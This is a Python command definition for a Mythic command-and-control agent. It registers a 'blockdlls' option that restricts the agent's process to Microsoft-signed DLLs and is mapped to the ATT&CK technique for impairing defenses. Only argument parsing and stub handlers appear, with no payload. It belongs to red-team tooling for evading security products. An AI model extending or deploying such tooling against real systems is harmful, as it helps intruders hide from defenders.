from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class BlockDllsArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="enable",
                type=ParameterType.Boolean,
                default_value=True,
                description="Block non-Microsoft DLLs in the current process",
                parameter_group_info=[ParameterGroupInfo(required=True, ui_position=1)],
            ),
        ]

    async def parse_arguments(self):
        if self.command_line and self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            text = (self.command_line or "enable").strip().lower()
            self.add_arg("enable", text not in ("0", "false", "disable", "off"))


class BlockDllsCommand(CommandBase):
    cmd = "blockdlls"
    needs_admin = False
    help_cmd = "blockdlls -Enable true|false"
    description = "Enable or disable Microsoft-signed-only DLL loading for the current process."
    version = 1
    author = "NomadAgent"
    attackmapping = ["T1562.001"]
    argument_class = BlockDllsArguments

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(TaskID=taskData.Task.ID, Success=True)
        response.DisplayParams = f"enable={taskData.args.get_arg('enable')}"
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
